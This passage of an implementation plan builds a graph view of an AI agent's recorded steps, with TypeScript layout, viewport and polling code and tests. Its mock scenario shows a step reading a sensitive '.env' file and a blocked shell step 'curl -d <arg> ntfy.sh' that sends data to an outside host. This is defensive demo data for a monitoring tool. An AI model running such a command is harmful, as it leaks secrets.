  it('moves a box to the next drawn step that touches it', () => {
    const steps = [makeStep(1, { file: 'f' }), makeStep(2), makeStep(3, { file: 'f' })]
    expect(node(layoutGraph(steps), 'file:f').position.y).toBe(centre(0) - 12)
    expect(node(layoutGraph(steps.slice(1)), 'file:f').position.y).toBe(centre(1) - 12)
  })
})

describe('edges', () => {
  it('joins adjacent drawn steps: N steps give N-1 chain edges in order', () => {
    const steps = [makeStep(100), makeStep(105), makeStep(7000)]
    const chain = layoutGraph(steps).edges.filter((e) => e.id.startsWith('chain:'))
    expect(chain.map((e) => [e.source, e.target])).toEqual([
      ['step:100', 'step:105'],
      ['step:105', 'step:7000'],
    ])
    expect(layoutGraph([makeStep(1)]).edges).toEqual([])
  })

  it('draws a blocked step red and dashed to its rule, above the nodes', () => {
    const layout = layoutGraph(MOCK_STEPS)
    const rule = edge(layout, 'rule-edge:40004')
    expect(rule.target).toBe('rule:R1')
    expect(rule.style).toMatchObject({ stroke: 'var(--color-blocked)', strokeDasharray: '8 6' })
    expect(rule.zIndex).toBe(1)
    const host = edge(layout, 'host-edge:40004')
    expect(host.style).toMatchObject({ stroke: 'var(--color-blocked)', strokeDasharray: '8 6' })
    expect(host.zIndex).toBe(1)
  })

  it('draws a warned step with a dashed purple edge to its rule', () => {
    const layout = layoutGraph([makeStep(1, { verdict: 'warned', rule: 'R1', host: 'x.com' })])
    const rule = edge(layout, 'rule-edge:1')
    expect(rule.style).toMatchObject({ stroke: 'var(--color-warned)', strokeDasharray: '8 6' })
    expect(rule.zIndex).toBe(1)
    expect(edge(layout, 'host-edge:1').style?.strokeDasharray).toBeUndefined()
  })

  it('names a handle on both ends of every edge, and every handle exists', () => {
    const layout = layoutGraph(MOCK_STEPS)
    for (const e of layout.edges) {
      expect(e.sourceHandle).toBeTruthy()
      expect(e.targetHandle).toBeTruthy()
      const source = node(layout, e.source)
      const target = node(layout, e.target)
      expect(source.handles?.some((h) => h.id === e.sourceHandle && h.type === 'source')).toBe(true)
      expect(target.handles?.some((h) => h.id === e.targetHandle && h.type === 'target')).toBe(true)
    }
  })

  it('gives every node a fixed size, so nothing depends on measuring', () => {
    for (const n of layoutGraph(MOCK_STEPS).nodes) {
      expect(n.width).toBeGreaterThan(0)
      expect(n.height).toBeGreaterThan(0)
    }
  })
})

type Rect = { id: string; x0: number; x1: number; y0: number; y1: number }
const rect = (n: GraphNode): Rect => ({
  id: n.id, x0: n.position.x, x1: n.position.x + (n.width ?? 0), y0: n.position.y, y1: n.position.y + (n.height ?? 0),
})
const overlap = (a: Rect, b: Rect) => a.x0 < b.x1 && b.x0 < a.x1 && a.y0 < b.y1 && b.y0 < a.y1

function busy(count: number): Step[] {
  return Array.from({ length: count }, (_, i) =>
    makeStep(40000 + i, {
      file: i % 3 === 0 ? `dir/file${i}.ts` : null,
      host: i % 2 === 0 ? `h${i}.com` : null,
      rule: i % 4 === 0 ? `R${i}` : null,
      verdict: i % 4 === 0 ? 'blocked' : 'allowed',
    }),
  )
}

describe('no overlap', () => {
  it('keeps every box clear of every other, including host above rule', () => {
    const rects = layoutGraph(busy(20)).nodes.map(rect)
    for (let i = 0; i < rects.length; i++) {
      for (let j = i + 1; j < rects.length; j++) {
        expect(overlap(rects[i], rects[j]), `${rects[i].id} vs ${rects[j].id}`).toBe(false)
      }
    }
  })

  it('leaves a 4 px gap between a rule and the next row host', () => {
    const steps = [makeStep(1, { host: 'a', rule: 'R1', verdict: 'blocked' }), makeStep(2, { host: 'b' })]
    const layout = layoutGraph(steps)
    const ruleBottom = node(layout, 'rule:R1').position.y + LANE_H
    expect(node(layout, 'host:b').position.y - ruleBottom).toBe(4)
  })
})

describe('stability', () => {
  const positions = (layout: Layout) => new Map(layout.nodes.map((n) => [n.id, { ...n.position }]))

  it('a pure append moves nothing that was already drawn', () => {
    const before = positions(layoutGraph(busy(12)))
    const after = positions(layoutGraph(busy(13)))
    for (const [id, p] of before) expect(after.get(id), id).toEqual(p)
  })

  it('a window slide shifts every row; only a box whose anchor left moves on its own', () => {
    const base: Step[] = busy(20).map((s): Step => ({ ...s, file: null, host: null, rule: null }))
    base[0] = { ...base[0], file: 'shared.txt' }
    base[19] = { ...base[19], file: 'shared.txt' }
    base[5] = { ...base[5], host: 'h.com' }
    const slid = [...base.slice(1), makeStep(40020)]

    const before = layoutGraph(base)
    const after = layoutGraph(slid)

    expect(has(after, 'step:40000')).toBe(false)
    expect(after.edges.some((e) => e.id === 'file-edge:40000' || e.id === 'chain:40000:40001')).toBe(false)

    // The shared file is now level with the later step that touches it.
    expect(node(after, 'file:shared.txt').position.y).toBe(centre(18) - 12)
    expect(edge(after, 'file-edge:40019').target).toBe('file:shared.txt')

    // Everything else keeps its offset to its neighbours: one pitch up.
    expect(node(after, 'step:40005').position.y).toBe(node(before, 'step:40005').position.y - ROW_PITCH)
    expect(node(after, 'host:h.com').position.y).toBe(node(before, 'host:h.com').position.y - ROW_PITCH)
  })
})
```

- [ ] **Step 2: Run it to see it fail**

Run: `npm --prefix ui test -- src/graph/layout.test.ts`
Expected: FAIL, `Failed to resolve import "./layout"`.

- [ ] **Step 3: Write the implementation**

Create `ui/src/graph/mock.ts`:

```ts
import type { Step } from './types'

/** The demo story: orders start at 40,000 like real sessions do. */
export const MOCK_STEPS: readonly Step[] = [
  { order: 40000, kind: 'read', verdict: 'allowed', tool: null, file: 'README.md', sensitive: false, command: null, host: null, rule: null },
  { order: 40001, kind: 'read', verdict: 'allowed', tool: null, file: '.env', sensitive: true, command: null, host: null, rule: null },
  { order: 40002, kind: 'read', verdict: 'allowed', tool: null, file: 'README.md', sensitive: false, command: null, host: null, rule: null },
  { order: 40003, kind: 'shell', verdict: 'allowed', tool: null, file: null, sensitive: false, command: 'ls', host: null, rule: null },
  { order: 40004, kind: 'shell', verdict: 'blocked', tool: null, file: null, sensitive: false, command: 'curl -d <arg> ntfy.sh', host: 'ntfy.sh', rule: 'R1' },
]
```

Create `ui/src/graph/layout.ts`:

```ts
import { Position, type Edge, type Node, type NodeHandle } from '@xyflow/react'
import type { Step } from './types'

// All sizes in px. Rows are 56 px apart; row i is the cell [56i, 56i + 56).
export const ROW_PITCH = 56
export const STEP_W = 400
export const STEP_H = 44
export const FILE_W = 220
export const HOST_W = 200
export const LANE_H = 24
export const GUTTER = 40
export const SIDE_PAD = 16
export const STEP_X = SIDE_PAD
export const FILE_X = STEP_X + STEP_W + GUTTER
export const HOST_X = FILE_X + FILE_W + GUTTER
export const CONTENT_W = HOST_X + HOST_W + SIDE_PAD
export const TOP_PAD = 48
export const BOTTOM_PAD = 24
// Hosts take the upper sub-slot of their anchor row, rules the lower one.
const HOST_DY = -26
const RULE_DY = 2
const FILE_DY = -12
// React Flow's default <Handle> is 6 px; the handles array mirrors that so the
// edge ends match before and after the browser measures the DOM.
const HANDLE = 6

export type StepNode = Node<{ step: Step }, 'step'>
export type FileNode = Node<{ path: string; sensitive: boolean }, 'file'>
export type HostNode = Node<{ host: string }, 'host'>
export type RuleNode = Node<{ rule: string }, 'rule'>
export type GraphNode = StepNode | FileNode | HostNode | RuleNode

export interface Layout {
  nodes: GraphNode[]
  edges: Edge[]
  rowCount: number
}

function handle(
  id: string,
  type: 'source' | 'target',
  position: Position,
  w: number,
  h: number,
): NodeHandle {
  const half = HANDLE / 2
  const spot: Record<Position, [number, number]> = {
    [Position.Top]: [w / 2 - half, -half],
    [Position.Bottom]: [w / 2 - half, h - half],
    [Position.Left]: [-half, h / 2 - half],
    [Position.Right]: [w - half, h / 2 - half],
  }
  const [x, y] = spot[position]
  return { id, type, position, x, y, width: HANDLE, height: HANDLE }
}

const STEP_HANDLES: NodeHandle[] = [
  handle('t', 'target', Position.Top, STEP_W, STEP_H),
  handle('b', 'source', Position.Bottom, STEP_W, STEP_H),
  handle('r', 'source', Position.Right, STEP_W, STEP_H),
]

function boxHandles(w: number): NodeHandle[] {
  return [handle('l', 'target', Position.Left, w, LANE_H)]
}

const BASE = { draggable: false, selectable: false, focusable: false, style: { pointerEvents: 'all' as const } }

function rowCentre(row: number): number {
  return row * ROW_PITCH + ROW_PITCH / 2
}

function link(
  id: string,
  from: Step,
  to: string,
  style: Edge['style'],
  zIndex?: number,
): Edge {
  return { id, source: `step:${from.order}`, sourceHandle: 'r', target: to, targetHandle: 'l', style, zIndex }
}

/**
 * Pure layout. Positions come only from a step's index in `steps`, never from
 * `step.order` (orders reach tens of thousands). A file, host or rule is one
 * box, level with the first step in the list that touches it.
 */
export function layoutGraph(steps: readonly Step[]): Layout {
  const fileRow = new Map<string, number>()
  const hostRow = new Map<string, number>()
  const ruleRow = new Map<string, number>()
  const secretFiles = new Set<string>()

  steps.forEach((step, row) => {
    if (step.file !== null) {
      if (!fileRow.has(step.file)) fileRow.set(step.file, row)
      if (step.sensitive) secretFiles.add(step.file)
    }
    if (step.host !== null && !hostRow.has(step.host)) hostRow.set(step.host, row)
    if (step.rule !== null && !ruleRow.has(step.rule)) ruleRow.set(step.rule, row)
  })

  const nodes: GraphNode[] = []
  const edges: Edge[] = []

  steps.forEach((step, row) => {
    const cy = rowCentre(row)
    nodes.push({
      id: `step:${step.order}`,
      type: 'step',
      position: { x: STEP_X, y: cy - STEP_H / 2 },
      width: STEP_W,
      height: STEP_H,
      data: { step },
      handles: STEP_HANDLES,
      ...BASE,
    })

    const previous = steps[row - 1]
    if (previous !== undefined) {
      edges.push({
        id: `chain:${previous.order}:${step.order}`,
        type: 'straight',
        source: `step:${previous.order}`,
        sourceHandle: 'b',
        target: `step:${step.order}`,
        targetHandle: 't',
        style: { stroke: 'var(--color-chain)', strokeWidth: 3 },
      })
    }

    if (step.file !== null) {
      edges.push(
        link(`file-edge:${step.order}`, step, `file:${step.file}`, {
          stroke: step.sensitive ? 'var(--color-secret)' : 'var(--color-aux)',
          strokeWidth: 2,
        }),
      )
    }
    if (step.host !== null) {
      const blocked = step.verdict === 'blocked'
      edges.push(
        link(
          `host-edge:${step.order}`,
          step,
          `host:${step.host}`,
          blocked
            ? { stroke: 'var(--color-blocked)', strokeWidth: 2.5, strokeDasharray: '8 6' }
            : { stroke: 'var(--color-aux)', strokeWidth: 2 },
          blocked ? 1 : undefined,
        ),
      )
    }
    if (step.rule !== null) {
      const warned = step.verdict === 'warned'
      edges.push(
        link(
          `rule-edge:${step.order}`,
          step,
          `rule:${step.rule}`,
          {
            stroke: warned ? 'var(--color-warned)' : 'var(--color-blocked)',
            strokeWidth: 2.5,
            strokeDasharray: '8 6',
          },
          1,
        ),
      )
    }
  })

  for (const [path, row] of fileRow) {
    nodes.push({
      id: `file:${path}`,
      type: 'file',
      position: { x: FILE_X, y: rowCentre(row) + FILE_DY },
      width: FILE_W,
      height: LANE_H,
      data: { path, sensitive: secretFiles.has(path) },
      handles: boxHandles(FILE_W),
      ...BASE,
    })
  }
  for (const [host, row] of hostRow) {
    nodes.push({
      id: `host:${host}`,
      type: 'host',
      position: { x: HOST_X, y: rowCentre(row) + HOST_DY },
      width: HOST_W,
      height: LANE_H,
      data: { host },
      handles: boxHandles(HOST_W),
      ...BASE,
    })
  }
  for (const [rule, row] of ruleRow) {
    nodes.push({
      id: `rule:${rule}`,
      type: 'rule',
      position: { x: HOST_X, y: rowCentre(row) + RULE_DY },
      width: HOST_W,
      height: LANE_H,
      data: { rule },
      handles: boxHandles(HOST_W),
      ...BASE,
    })
  }

  return { nodes, edges, rowCount: steps.length }
}
```

- [ ] **Step 4: Run the tests and the web check**

Run: `npm --prefix ui test -- src/graph/layout.test.ts`
Expected: PASS (21 tests).
Run: `npm --prefix ui run check`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add ui/src/graph/layout.ts ui/src/graph/mock.ts ui/src/graph/layout.test.ts
git commit -m "$(cat <<'EOF'
AG-28: add the pure graph layout and the mock scenario

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 4: Viewport: keep the newest step in view

**Files:**
- Create: `ui/src/graph/viewport.ts`
- Test: `ui/src/graph/viewport.test.ts`, `ui/src/graph/follow.test.ts`

**Interfaces:**
- Consumes: layout constants and `layoutGraph` (Task 3), `windowReducer`, `initialWindowState`, `WINDOW_SIZE` (Task 2), `stepsFrom`, `makeStep` (Task 2).
- Produces: `interface PaneSize { width: number; height: number }`; `FALLBACK_PANE = { width: 960, height: 1080 }`; `resolvePane(pane: PaneSize): PaneSize`; `computeViewport(rowCount: number, pane: PaneSize): Viewport` (always `zoom: 1`).

- [ ] **Step 1: Write the failing tests**

Create `ui/src/graph/viewport.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { BOTTOM_PAD, CONTENT_W, HOST_W, HOST_X, ROW_PITCH, TOP_PAD, layoutGraph, type GraphNode } from './layout'
import { makeStep } from './testing'
import { FALLBACK_PANE, computeViewport, resolvePane, type PaneSize } from './viewport'

const POINT = { width: 960, height: 1080 }

function inside(n: GraphNode, vp: { x: number; y: number; zoom: number }, pane: PaneSize): boolean {
  const x0 = n.position.x * vp.zoom + vp.x
  const y0 = n.position.y * vp.zoom + vp.y
  const x1 = x0 + (n.width ?? 0) * vp.zoom
  const y1 = y0 + (n.height ?? 0) * vp.zoom
  return x0 >= 0 && y0 >= 0 && x1 <= pane.width && y1 <= pane.height
}

/** Steps from order 40,000 where the newest step touches a new file, host and rule. */
function session(count: number) {
  return Array.from({ length: count }, (_, i) =>
    makeStep(40000 + i, { file: `f${i}`, host: `h${i}`, rule: `R${i}`, verdict: 'blocked' }),
  )
}

describe('computeViewport', () => {
  it('starts at the top padding and never leaves zoom 1', () => {
    expect(computeViewport(0, POINT)).toEqual({ x: 0, y: TOP_PAD, zoom: 1 })
    expect(computeViewport(5, POINT)).toEqual({ x: 0, y: TOP_PAD, zoom: 1 })
  })

  it('follows the newest row once the rows outgrow the pane', () => {
    const vp = computeViewport(20, POINT)
    expect(vp.y).toBe(POINT.height - BOTTOM_PAD - 20 * ROW_PITCH)
    expect(vp.y + 20 * ROW_PITCH).toBe(POINT.height - BOTTOM_PAD)
  })

  it.each([1, 5, 18, 19, 20])('keeps the newest step and its own boxes in a 960x1080 pane with %i rows', (count) => {
    const layout = layoutGraph(session(count))
    const vp = computeViewport(layout.rowCount, POINT)
    const newest = 40000 + count - 1
    const mine = layout.nodes.filter((n) => n.id.endsWith(`${newest}`) || n.id === `file:f${count - 1}` || n.id === `host:h${count - 1}` || n.id === `rule:R${count - 1}`)
    expect(mine.length).toBe(4)
    for (const n of mine) expect(inside(n, vp, POINT), n.id).toBe(true)
  })

  it('keeps the rules lane visible in a pane narrower than the content', () => {
    const vp = computeViewport(3, { width: 720, height: 1080 })
    expect(vp.x).toBe(720 - CONTENT_W)
    expect(HOST_X + HOST_W + vp.x).toBeLessThanOrEqual(720)
  })

  it('recomputes when the pane changes after mount', () => {
    expect(computeViewport(20, { width: 960, height: 1080 }).y).not.toBe(computeViewport(20, { width: 960, height: 700 }).y)
  })

  it.each([
    { width: 0, height: 0 },
    { width: Number.NaN, height: Number.NaN },
    { width: -5, height: Infinity },
  ])('falls back to 960x1080 for an unmeasured pane %j', (pane) => {
    expect(resolvePane(pane)).toEqual(FALLBACK_PANE)
    const vp = computeViewport(20, pane)
    expect(vp).toEqual(computeViewport(20, FALLBACK_PANE))
    expect(Object.values(vp).every(Number.isFinite)).toBe(true)
  })
})
```

Create `ui/src/graph/follow.test.ts` (merging real-sized polls, layout and camera together, the sequence that failed on 2026-10-01):

```ts
import { describe, expect, it } from 'vitest'
import { layoutGraph } from './layout'
import { stepsFrom } from './testing'
import { computeViewport } from './viewport'
import { initialWindowState, windowReducer, WINDOW_SIZE, type WindowState } from './window'

const PANE = { width: 960, height: 1080 }

/** The newest step's box must sit fully inside the pane at the computed camera. */
function newestStepInView(state: WindowState): boolean {
  const layout = layoutGraph(state.steps)
  const vp = computeViewport(layout.rowCount, PANE)
  const newest = state.steps.at(-1)
  const box = layout.nodes.find((n) => n.id === `step:${newest?.order}`)
  if (box === undefined) return false
  const top = box.position.y * vp.zoom + vp.y
  const bottom = top + (box.height ?? 0) * vp.zoom
  const left = box.position.x * vp.zoom + vp.x
  const right = left + (box.width ?? 0) * vp.zoom
  return top >= 0 && bottom <= PANE.height && left >= 0 && right <= PANE.width
}

describe('the newest step stays in view as polls arrive (real-sized orders)', () => {
  it('follows from the first 10 steps through 30 more', () => {
    // Each poll brings the server's last 10 steps, as GET /api/steps does.
    const polls = [
      stepsFrom(40000, 10),
      stepsFrom(40005, 10),
      stepsFrom(40010, 10),
      stepsFrom(40020, 10),
      stepsFrom(40030, 10),
      stepsFrom(40040, 10),
    ]
    let state = initialWindowState()
    for (const steps of polls) {
      state = windowReducer(state, { type: 'snapshot', session: 's', steps })
      expect(state.steps.length).toBeLessThanOrEqual(WINDOW_SIZE)
      expect(newestStepInView(state), `after orders up to ${state.steps.at(-1)?.order}`).toBe(true)
    }
    expect(state.steps.at(-1)?.order).toBe(40049)
    expect(state.steps).toHaveLength(WINDOW_SIZE)
  })

  it('keeps the newest step in view when the pane is shorter than the window', () => {
    let state = initialWindowState()
    state = windowReducer(state, { type: 'snapshot', session: 's', steps: stepsFrom(40000, 10) })
    state = windowReducer(state, { type: 'snapshot', session: 's', steps: stepsFrom(40010, 10) })
    const layout = layoutGraph(state.steps)
    const short = { width: 960, height: 600 }
    const vp = computeViewport(layout.rowCount, short)
    const box = layout.nodes.find((n) => n.id === 'step:40019')!
    expect(box.position.y + vp.y + (box.height ?? 0)).toBeLessThanOrEqual(short.height)
    expect(box.position.y + vp.y).toBeGreaterThanOrEqual(0)
  })
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `npm --prefix ui test -- src/graph/viewport.test.ts src/graph/follow.test.ts`
Expected: FAIL, `Failed to resolve import "./viewport"`.

- [ ] **Step 3: Write the implementation**

Create `ui/src/graph/viewport.ts`:

```ts
import type { Viewport } from '@xyflow/react'
import { BOTTOM_PAD, CONTENT_W, ROW_PITCH, TOP_PAD } from './layout'

export interface PaneSize {
  width: number
  height: number
}

/** The 960x1080 half screen the page is designed for. */
export const FALLBACK_PANE: PaneSize = { width: 960, height: 1080 }

function usable(n: number): boolean {
  return Number.isFinite(n) && n > 0
}

/** Replace an unmeasured (0x0, NaN) pane with the design size. */
export function resolvePane(pane: PaneSize): PaneSize {
  return {
    width: usable(pane.width) ? pane.width : FALLBACK_PANE.width,
    height: usable(pane.height) ? pane.height : FALLBACK_PANE.height,
  }
}

/**
 * Where to put the camera: zoom 1 always. Vertically, keep the newest row's
 * bottom at the pane's bottom padding once rows outgrow the pane. Horizontally,
 * a pane narrower than the content shifts left so the rules lane stays visible
 * (the step column clips instead).
 */
export function computeViewport(rowCount: number, pane: PaneSize): Viewport {
  const { width, height } = resolvePane(pane)
  const y = Math.min(TOP_PAD, height - BOTTOM_PAD - rowCount * ROW_PITCH)
  const x = Math.min(0, width - CONTENT_W)
  return { x, y, zoom: 1 }
}
```

- [ ] **Step 4: Run the tests and the web check**

Run: `npm --prefix ui test -- src/graph/viewport.test.ts src/graph/follow.test.ts`
Expected: PASS.
Run: `npm --prefix ui run check`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add ui/src/graph/viewport.ts ui/src/graph/viewport.test.ts ui/src/graph/follow.test.ts
git commit -m "$(cat <<'EOF'
AG-28: add the camera that keeps the newest step in view

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 5: `useRecorder`: polling, OFFLINE, mock and "New session"

**Files:**
- Create: `ui/src/graph/useRecorder.ts`
- Test: `ui/src/graph/useRecorder.test.tsx`

**Interfaces:**
- Consumes: `parseSnapshot`, `windowReducer`, `initialWindowState`, `readIgnored`, `writeIgnored`, `MOCK_STEPS`, `Step`, `IGNORE_KEY`, `stepsFrom`.
- Produces: `POLL_GAP_MS = 1000`, `POLL_TIMEOUT_MS = 1500`, `MOCK_INTERVAL_MS = 1500`; `interface Recorder { steps: readonly Step[]; offline: boolean; newSession: () => void }`; `useRecorder(mock: boolean): Recorder`.

- [ ] **Step 1: Write the failing tests**

Create `ui/src/graph/useRecorder.test.tsx`:

```tsx
import { act, renderHook } from '@testing-library/react'
import { StrictMode } from 'react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { IGNORE_KEY } from './ignoredSession'
import { MOCK_STEPS } from './mock'
import { stepsFrom } from './testing'
import type { Step } from './types'
import { MOCK_INTERVAL_MS, POLL_GAP_MS, POLL_TIMEOUT_MS, useRecorder } from './useRecorder'

type Body = { session: string | null; steps: Step[] }

function respond(body: Body): Response {
  return { ok: true, json: async () => body } as Response
}

/** A fetch that never answers until aborted, like a hung server. */
function hang(_url: unknown, init?: RequestInit): Promise<Response> {
  return new Promise((_resolve, reject) => {
    init?.signal?.addEventListener('abort', () => reject(new DOMException('aborted', 'AbortError')))
  })
}

async function advance(ms: number): Promise<void> {
  await act(async () => {
    await vi.advanceTimersByTimeAsync(ms)
  })
}

beforeEach(() => {
  vi.useFakeTimers()
  window.sessionStorage.clear()
})

afterEach(() => {
  vi.useRealTimers()
  vi.unstubAllGlobals()
  vi.restoreAllMocks()
})

describe('useRecorder (real mode)', () => {
  it('polls /api/steps right away and draws what comes back', async () => {
    const fetchMock = vi.fn(async () => respond({ session: 's', steps: stepsFrom(40000, 10) }))
    vi.stubGlobal('fetch', fetchMock)
    const { result } = renderHook(() => useRecorder(false))
    await advance(0)
    expect(fetchMock).toHaveBeenCalledWith('/api/steps', expect.objectContaining({ cache: 'no-store' }))
    expect(result.current.steps).toHaveLength(10)
    expect(result.current.offline).toBe(false)
  })

  it('keeps earlier steps across polls and stays within 20, from orders near 40,000', async () => {
    const bodies = [stepsFrom(40000, 10), stepsFrom(40005, 10), stepsFrom(40015, 10), stepsFrom(40025, 10), stepsFrom(40035, 10)]
    let call = 0
    vi.stubGlobal('fetch', vi.fn(async () => respond({ session: 's', steps: bodies[Math.min(call++, bodies.length - 1)] })))
    const { result } = renderHook(() => useRecorder(false))
    await advance(0)
    expect(result.current.steps.map((s) => s.order)).toEqual(stepsFrom(40000, 10).map((s) => s.order))
    await advance(POLL_GAP_MS)
    expect(result.current.steps).toHaveLength(15)
    await advance(POLL_GAP_MS * 3)
    expect(result.current.steps).toHaveLength(20)
    expect(result.current.steps.at(-1)?.order).toBe(40044)
    expect(result.current.steps[0].order).toBe(40025)
  })

  it('goes OFFLINE within 3 s of the server dying, keeps the drawing, and recovers', async () => {
    let mode: 'up' | 'hung' = 'up'
    vi.stubGlobal('fetch', vi.fn((url: unknown, init?: RequestInit) =>
      mode === 'up' ? Promise.resolve(respond({ session: 's', steps: stepsFrom(40000, 3) })) : hang(url, init),
    ))
    const { result } = renderHook(() => useRecorder(false))
    await advance(0)
    expect(result.current.steps).toHaveLength(3)

    mode = 'hung'
    await advance(POLL_GAP_MS + POLL_TIMEOUT_MS - 100)
    expect(result.current.offline).toBe(false)
    await advance(200)
    expect(result.current.offline).toBe(true)
    expect(POLL_GAP_MS + POLL_TIMEOUT_MS).toBeLessThan(3000)
    expect(result.current.steps).toHaveLength(3)

    mode = 'up'
    await advance(POLL_GAP_MS + 10)
    expect(result.current.offline).toBe(false)
  })

  it('treats a refused connection, a bad status and a bad body as OFFLINE', async () => {
    const fetchMock = vi
      .fn()
      .mockRejectedValueOnce(new TypeError('refused'))
      .mockResolvedValueOnce({ ok: false, json: async () => ({}) } as Response)
      .mockResolvedValueOnce({ ok: true, json: async () => 'nope' } as Response)
      .mockResolvedValue(respond({ session: null, steps: [] }))
    vi.stubGlobal('fetch', fetchMock)
    const { result } = renderHook(() => useRecorder(false))

    await advance(0)
    expect(result.current.offline).toBe(true)
    await advance(POLL_GAP_MS)
    expect(result.current.offline).toBe(true)
    await advance(POLL_GAP_MS)
    expect(result.current.offline).toBe(true)
    await advance(POLL_GAP_MS)
    expect(result.current.offline).toBe(false)
  })

  it('empties on {session: null, steps: []} (after a server restart)', async () => {
    const bodies: Body[] = [{ session: 's', steps: stepsFrom(40000, 3) }, { session: null, steps: [] }]
    let call = 0
    vi.stubGlobal('fetch', vi.fn(async () => respond(bodies[Math.min(call++, 1)])))
    const { result } = renderHook(() => useRecorder(false))
    await advance(0)
    expect(result.current.steps).toHaveLength(3)
    await advance(POLL_GAP_MS)
    expect(result.current.steps).toHaveLength(0)
  })

  it('New session empties the graph, stores the id, and keeps it empty', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => respond({ session: 's', steps: stepsFrom(40000, 3) })))
    const { result } = renderHook(() => useRecorder(false))
    await advance(0)
    act(() => result.current.newSession())
    expect(result.current.steps).toHaveLength(0)
    expect(window.sessionStorage.getItem(IGNORE_KEY)).toBe('s')
    await advance(POLL_GAP_MS * 3)
    expect(result.current.steps).toHaveLength(0)
  })

  it('New session still empties the graph when sessionStorage is blocked', async () => {
    vi.spyOn(Storage.prototype, 'getItem').mockImplementation(() => {
      throw new Error('blocked')
    })
    vi.spyOn(Storage.prototype, 'setItem').mockImplementation(() => {
      throw new Error('blocked')
    })
    vi.stubGlobal('fetch', vi.fn(async () => respond({ session: 's', steps: stepsFrom(40000, 3) })))
    const { result } = renderHook(() => useRecorder(false))
    await advance(0)
    expect(result.current.steps).toHaveLength(3)
    act(() => result.current.newSession())
    await advance(POLL_GAP_MS * 2)
    expect(result.current.steps).toHaveLength(0)
  })

  it('a response already in flight when New session is clicked does not refill the graph', async () => {
    let release: (r: Response) => void = () => {}
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce(respond({ session: 's', steps: stepsFrom(40000, 3) }))
      .mockImplementationOnce(() => new Promise<Response>((resolve) => (release = resolve)))
      .mockResolvedValue(respond({ session: 's', steps: stepsFrom(40000, 3) }))
    vi.stubGlobal('fetch', fetchMock)
    const { result } = renderHook(() => useRecorder(false))
    await advance(0)
    await advance(POLL_GAP_MS)
    act(() => result.current.newSession())
    await act(async () => {
      release(respond({ session: 's', steps: stepsFrom(40000, 4) }))
    })
    await advance(0)
    expect(result.current.steps).toHaveLength(0)
  })

  it('stays empty across a reload until a different session id arrives', async () => {
    window.sessionStorage.setItem(IGNORE_KEY, 's')
    let session = 's'
    vi.stubGlobal('fetch', vi.fn(async () => respond({ session, steps: stepsFrom(40000, 3) })))
    const { result } = renderHook(() => useRecorder(false))
    await advance(0)
    expect(result.current.steps).toHaveLength(0)
    session = 't'
    await advance(POLL_GAP_MS)
    expect(result.current.steps).toHaveLength(3)
    expect(window.sessionStorage.getItem(IGNORE_KEY)).toBeNull()
  })

  it('stops polling on unmount', async () => {
    const fetchMock = vi.fn(async () => respond({ session: 's', steps: [] }))
    vi.stubGlobal('fetch', fetchMock)
    const { unmount } = renderHook(() => useRecorder(false))
    await advance(0)
    unmount()
    const calls = fetchMock.mock.calls.length
    await advance(POLL_GAP_MS * 5)
    expect(fetchMock.mock.calls.length).toBe(calls)
  })

  it('runs one polling loop under StrictMode', async () => {
    const fetchMock = vi.fn(async () => respond({ session: 's', steps: [] }))
    vi.stubGlobal('fetch', fetchMock)
    renderHook(() => useRecorder(false), { wrapper: StrictMode })
    await advance(100)
    const before = fetchMock.mock.calls.length
    await advance(3000)
    expect(fetchMock.mock.calls.length - before).toBe(3)
  })
})

describe('useRecorder (mock mode)', () => {
  it('replays the scenario one step per 1.5 s without calling the server', async () => {
    const fetchMock = vi.fn()
    vi.stubGlobal('fetch', fetchMock)
    const { result } = renderHook(() => useRecorder(true))
    expect(result.current.steps).toHaveLength(1)
    for (let n = 2; n <= MOCK_STEPS.length; n++) {
      await advance(MOCK_INTERVAL_MS)
      expect(result.current.steps).toHaveLength(n)
    }
    await advance(MOCK_INTERVAL_MS * 3)
    expect(result.current.steps).toHaveLength(MOCK_STEPS.length)
    expect(result.current.steps[0].order).toBe(40000)
    expect(fetchMock).not.toHaveBeenCalled()
    expect(result.current.offline).toBe(false)
  })

  it('New session restarts the scenario', async () => {
    vi.stubGlobal('fetch', vi.fn())
    const { result } = renderHook(() => useRecorder(true))
    await advance(MOCK_INTERVAL_MS * 4)
    expect(result.current.steps).toHaveLength(5)
    act(() => result.current.newSession())
    expect(result.current.steps).toHaveLength(1)
    expect(window.sessionStorage.getItem(IGNORE_KEY)).toBeNull()
  })
})
```

- [ ] **Step 2: Run it to see it fail**

Run: `npm --prefix ui test -- src/graph/useRecorder.test.tsx`
Expected: FAIL, `Failed to resolve import "./useRecorder"`.

- [ ] **Step 3: Write the implementation**

Create `ui/src/graph/useRecorder.ts`:

```ts
import { useCallback, useEffect, useReducer, useState } from 'react'
import { readIgnored, writeIgnored } from './ignoredSession'
import { MOCK_STEPS } from './mock'
import { parseSnapshot } from './snapshot'
import type { Step } from './types'
import { initialWindowState, windowReducer } from './window'

export const POLL_GAP_MS = 1000
export const POLL_TIMEOUT_MS = 1500
export const MOCK_INTERVAL_MS = 1500

export interface Recorder {
  steps: readonly Step[]
  offline: boolean
  newSession: () => void
}

/**
 * The page's data source. Real mode polls GET /api/steps: one request, then a
 * 1 s gap, aborting after 1.5 s; one failure sets `offline` (worst case 2.5 s
 * after the server stops) and the last steps stay. Mock mode replays MOCK_STEPS
 * and never calls the server.
 */
export function useRecorder(mock: boolean): Recorder {
  const [state, dispatch] = useReducer(windowReducer, undefined, () =>
    initialWindowState(mock ? null : readIgnored()),
  )
  const [offline, setOffline] = useState(false)
  const [mockRun, setMockRun] = useState(0)

  useEffect(() => {
    if (!mock) writeIgnored(state.ignored)
  }, [mock, state.ignored])

  useEffect(() => {
    if (mock) return
    let cancelled = false
    let gap: ReturnType<typeof setTimeout> | undefined
    let active: AbortController | undefined

    async function poll(): Promise<void> {
      const controller = new AbortController()
      active = controller
      const abortTimer = setTimeout(() => controller.abort(), POLL_TIMEOUT_MS)
      try {
